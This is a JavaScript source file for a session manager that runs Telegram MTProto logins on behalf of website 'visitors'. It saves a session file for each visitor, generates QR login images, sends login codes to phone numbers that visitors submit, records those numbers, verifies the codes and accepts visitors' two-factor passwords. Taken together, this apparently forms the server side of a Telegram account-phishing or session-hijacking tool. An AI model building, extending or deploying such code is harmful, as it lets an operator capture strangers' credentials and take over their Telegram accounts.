const MTProtoService = require("../services/MTProto-service");
const path = require("path");
const visitorService = require("../services/visitor-service");
const botService = require("../services/bot-service");

class SessionManager {
  constructor() {
    this.processes = [];
  }

  deactivateProcess(id) {
    for (var i = 0; i < this.processes.length; i++) {
      if (this.processes[i].id === id) this.processes[i].active = false;
    }
  }

  cleanPool() {
    this.processes = this.processes.filter(
      (process) => process.active !== false
    );
  }

  getProcessById(id) {
    for (var i = 0; i < this.processes.length; i++) {
      if (this.processes[i].id === id && this.processes[i].active)
        return this.processes[i];
    }
  }

  editProcessConfig(id, config) {
    for (var i = 0; i < this.processes.length; i++) {
      if (this.processes[i].id !== id) continue;
      this.processes[i] = {
        ...this.processes[i],
        ...config,
      };
    }
  }

  async createProcess(visitorId, useragent, title, platform) {
    try {
      const processExists = this.getProcessById(visitorId);
      if (processExists) return processExists;
      const service = MTProtoService.genInstance(
        path.join(__dirname, "sessions", `session_${visitorId}.json`),
        title,
        platform
      );
      const qrFname = `qr${visitorId}.png`;
      const config = await MTProtoService.getConfig(
        service,
        path.join(__dirname, "..", "static", qrFname)
      );
      const process = {
        service,
        id: visitorId,
        qrUrl: qrFname,
        active: true,
        useragent,
        ...config,
      };
      this.processes.push(process);
      return process;
    } catch (e) {
      console.error(e);
    }
  }

  async sendCode(visitorId, phone) {
    try {
      const process = await this.getProcessById(visitorId);
      const response = await MTProtoService.sendCode(process.service, phone);
      this.editProcessConfig(visitorId, {
        phone_code_hash: response.phone_code_hash,
      });
      switch (response._) {
        case "auth.sentCode":
          await visitorService.updatePhone(visitorId, phone);
          return {
            status: "CODE",
          };
      }
      return response;
    } catch (e) {
      console.error(e);
      return {
        status: "ERR",
      };
    }
  }

  async verify(visitorId, phone, code) {
    try {
      const process = await this.getProcessById(visitorId);
      return await MTProtoService.verify(
        process.service,
        phone,
        code,
        process.phone_code_hash,
        visitorId,
        process.useragent
      );
    } catch (e) {
      console.error(e);
    }
  }

  async send2FA(visitorId, pass) {
    try {
      const process = this.getProcessById(visitorId);
      const response = await MTProtoService.send2FA(
        process.service,
        pass,
        visitorId,
        process.useragent
      );

      return response;
    } catch (e) {
      console.error(e);
    }
  }

  async poolProcesses() {
    for (let i = 0; i < this.processes.length; i++) {
      if (!this.processes[i].active) continue;
      const result = await MTProtoService.importKey(
        this.processes[i].service,
        this.processes[i].token,
        this.processes[i].id,
        this.processes[i].useragent
      );
      MTProtoService.resolveResponse(result, (message) => {
        if (message === "SUCCESS") this.deactivateProcess(this.processes[i].id);
      });
    }
    //this.cleanPool();
  }
}

module.exports = new SessionManager();
